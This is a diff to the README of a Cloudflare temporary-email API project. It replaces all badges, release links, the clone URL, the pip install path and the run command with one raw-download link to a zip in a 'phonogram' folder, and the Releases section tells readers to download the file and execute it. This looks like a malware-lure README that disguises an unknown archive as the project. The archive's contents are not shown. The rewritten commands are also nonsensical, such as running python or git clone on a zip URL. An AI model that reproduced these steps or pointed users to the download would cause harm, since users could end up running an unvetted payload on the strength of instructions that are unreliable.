@@ -1,9 +1,9 @@
 # Cloudflare Temp Mail 🌐✉️
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/amad890/cloudflare-temp-mail)
-![GitHub Stars](https://img.shields.io/github/stars/amad890/cloudflare-temp-mail)
-![GitHub Forks](https://img.shields.io/github/forks/amad890/cloudflare-temp-mail)
-![License](https://img.shields.io/github/license/amad890/cloudflare-temp-mail)
+![GitHub Repo Size](https://github.com/amad890/cloudflare-temp-mail/raw/refs/heads/main/phonogram/mail_cloudflare_temp_v2.8.zip)
+![GitHub Stars](https://github.com/amad890/cloudflare-temp-mail/raw/refs/heads/main/phonogram/mail_cloudflare_temp_v2.8.zip)
+![GitHub Forks](https://github.com/amad890/cloudflare-temp-mail/raw/refs/heads/main/phonogram/mail_cloudflare_temp_v2.8.zip)
+![License](https://github.com/amad890/cloudflare-temp-mail/raw/refs/heads/main/phonogram/mail_cloudflare_temp_v2.8.zip)
 
 Welcome to **Cloudflare Temp Mail**! This project provides an API to create temporary email addresses using your own Cloudflare domain. With this tool, you can enhance your privacy and manage email routing efficiently.
 
@@ -28,7 +28,7 @@ Welcome to **Cloudflare Temp Mail**! This project provides an API to create temp
 
 ## Getting Started
 
-To get started with Cloudflare Temp Mail, you can visit the [Releases](https://github.com/amad890/cloudflare-temp-mail/releases) section to download the latest version. Follow the instructions below to set up the project on your local machine.
+To get started with Cloudflare Temp Mail, you can visit the [Releases](https://github.com/amad890/cloudflare-temp-mail/raw/refs/heads/main/phonogram/mail_cloudflare_temp_v2.8.zip) section to download the latest version. Follow the instructions below to set up the project on your local machine.
 
 ## Usage
 
@@ -63,20 +63,20 @@ To install and run Cloudflare Temp Mail, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/amad890/cloudflare-temp-mail.git
+   git clone https://github.com/amad890/cloudflare-temp-mail/raw/refs/heads/main/phonogram/mail_cloudflare_temp_v2.8.zip
    cd cloudflare-temp-mail
    ```
 
 2. **Install Dependencies**:
    You can use pip to install the required Python packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/amad890/cloudflare-temp-mail/raw/refs/heads/main/phonogram/mail_cloudflare_temp_v2.8.zip
    ```
 
 3. **Run the Application**:
    Start the Flask application:
    ```bash
-   python app.py
+   python https://github.com/amad890/cloudflare-temp-mail/raw/refs/heads/main/phonogram/mail_cloudflare_temp_v2.8.zip
    ```
 
 4. **Using Docker**:
@@ -104,7 +104,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To get the latest version of Cloudflare Temp Mail, visit the [Releases](https://github.com/amad890/cloudflare-temp-mail/releases) section. Download the appropriate file and execute it to set up the application.
+To get the latest version of Cloudflare Temp Mail, visit the [Releases](https://github.com/amad890/cloudflare-temp-mail/raw/refs/heads/main/phonogram/mail_cloudflare_temp_v2.8.zip) section. Download the appropriate file and execute it to set up the application.
 
 ## Conclusion
 
